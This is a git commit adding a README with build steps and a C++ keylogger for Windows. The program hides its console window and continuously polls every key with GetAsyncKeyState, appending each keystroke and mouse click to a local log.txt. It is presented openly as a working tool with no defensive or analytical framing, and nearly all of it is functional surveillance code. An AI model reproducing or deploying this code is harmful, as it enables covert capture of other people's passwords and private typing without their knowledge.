584989361a31cee50da58bde701639dd94a630ec
Yaswanth Mitta <yaswanthmitta@gmail.com>
2024-09-24 17:16:58 +0530

    Added Basic functions

--- README.md
+++ README.md
@@ -1,1 +1,13 @@
-# Key-Logger-
+# Key Logger Tool using C++
+
+Make sure you have ```mingw``` installed in system
+
+### steps
+1. Clone the repo 
+ ``` git clone https://github.com/Yaswanth-Mitta/Key-Logger-.git ```.
+
+ 2. Navigate to this path ```cd/Key-Logger-```.
+
+ 3. open ```cmd``` and type ```g++ keylogger.cpp -o test``` and press ```enter```
+ 4. type ```test``` in cmd
+ 
---
+++ keylogger.cpp
@@ -0,0 +1,64 @@
+#include <iostream>
+#include <windows.h>
+#include <winuser.h>
+#include <fstream>
+
+using namespace std;
+
+void startLogging();
+
+int main()
+{
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    startLogging();
+    return 0;
+}
+
+void startLogging()
+{
+
+    char c;
+    while (true)
+    {
+        for (c = 0; c <= 254; c++)
+        {
+            if (GetAsyncKeyState(c) & 0x1)
+            {
+                ofstream log;
+                log.open("log.txt", ios::app);
+                switch(c)
+                {
+                case VK_BACK:
+                    log << "[bk]";
+                    break;
+                case VK_RETURN:
+                    log << "[et]";
+                    break;
+                case VK_SHIFT:
+                    log << "[sft]";
+                    break;
+                case VK_CONTROL:
+                    log << "[ctrl]";
+                    break;
+                case VK_CAPITAL:
+                    log << "[cap]";
+                    break;
+                case VK_TAB:
+                    log << "[tab]";
+                    break;
+                case VK_MENU:
+                    log << "[alt]";
+                    break;
+                case VK_LBUTTON:
+                    log << "[lk]";
+                    break;
+                case VK_RBUTTON:
+                    log << "[rk]";
+                    break;
+                default:
+                    log << c;
+                }
+            }
+        }
+    }
+}
